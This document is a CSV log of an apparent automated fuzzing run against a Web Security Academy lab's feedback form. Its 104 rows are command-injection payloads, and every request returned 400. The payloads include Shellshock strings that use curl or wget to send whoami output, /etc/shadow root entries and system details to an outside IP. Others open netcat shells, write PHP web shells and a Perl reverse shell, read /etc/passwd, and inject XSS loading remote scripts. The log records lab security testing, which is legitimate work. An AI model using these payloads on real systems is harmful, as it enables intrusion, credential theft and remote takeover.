id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword_error,SearchKeyword_exception,SearchKeyword_illegal,SearchKeyword_invalid,SearchKeyword_fail,SearchKeyword_stack,SearchKeyword_access,SearchKeyword_directory,SearchKeyword_file,SearchKeyword_not found,SearchKeyword_unknown,SearchKeyword_uid=,SearchKeyword_c:\,SearchKeyword_varchar,SearchKeyword_ODBC,SearchKeyword_SQL,SearchKeyword_quotation mark,SearchKeyword_syntax,SearchKeyword_ORA-,SearchKeyword_111111,SearchKeyword_test,SearchKeyword_test2,SearchKeyword_'||Utl_Http.request('http://<yourservername>') from dual--,TimeDelay,ContentLength
id_fuzz_1,1,`,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,2,|| ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,3,| ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,4,; ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,5,',https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,6,"'""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,7,"""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,8,"""'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,9,& ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,10,&& ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,11,%0a,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,12,%0a%0d,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,13,%0Acat%20/etc/passwd,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,14,%0Aid,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,15,%0a id %0a,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,16,%0Aid%0A,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,17,%0a ping -i 30 127.0.0.1 %0a,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,18,%0A/usr/bin/id,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,19,%0A/usr/bin/id%0A,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,20,"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #"" |ping -n 21 127.0.0.1",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,21,%20{${phpinfo()}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,22,%20{${sleep(20)}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,23,%20{${sleep(3)}},https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,24,a|id|,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,25,a;id|,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,26,a;id;,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,27,"a;id
",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,28,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,29,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,30,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,31,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,32,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,33,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,34,"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,35,"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,36,"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,37,"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,38,"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,39,"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,40,"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,41,"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,42,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,43,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,44,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,45,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,46,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,47,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,48,"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,49,cat /etc/hosts,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,50,$(`cat /etc/passwd`),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,51,cat /etc/passwd,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,52,() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,53,| curl http://crowdshield.com/.testing/rce.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,54,& curl http://crowdshield.com/.testing/rce.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,55,; curl https://crowdshield.com/.testing/rce_vuln.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,56,&& curl https://crowdshield.com/.testing/rce_vuln.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,57,curl https://crowdshield.com/.testing/rce_vuln.txt,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,58," curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #"" |curl https://crowdshield.com/.testing/rce_vuln.txt",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,59,"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #"" |curl https://crowdshield.com/.testing/rce_vuln.txt",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,60,$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,61,dir,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,62,| dir,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,63,; dir,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,64,$(`dir`),https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,65,& dir,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,66,&&dir,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,67,&& dir,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,68,"| dir C:""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,69,"; dir C:""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,70,"& dir C:""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,71,"&& dir C:""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,72,"dir C:""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,73,| dir C:\Documents and Settings\*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,74,; dir C:\Documents and Settings\*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,75,& dir C:\Documents and Settings\*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,76,&& dir C:\Documents and Settings\*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,77,dir C:\Documents and Settings\*,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,78,| dir C:\Users,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,79,; dir C:\Users,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,80,& dir C:\Users,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,81,&& dir C:\Users,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,82,dir C:\Users,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,83,;echo%20'<script>alert(1)</script>',https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,84,echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,85,"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,86,"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,87,"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,88,"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,89,"echo ""<?php include($_GET['page']); ?>"" > rfi.php",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,90,"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,91,"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,92,"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,93,"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,94,"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,95,"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,96,"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,97,"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,98,"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,99,"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,100,;echo '<script>alert(1)</script>',https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,101,echo '<script>alert(1)</script>'// XXXXXXXXXXX,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,102,echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,103,"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,104,"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
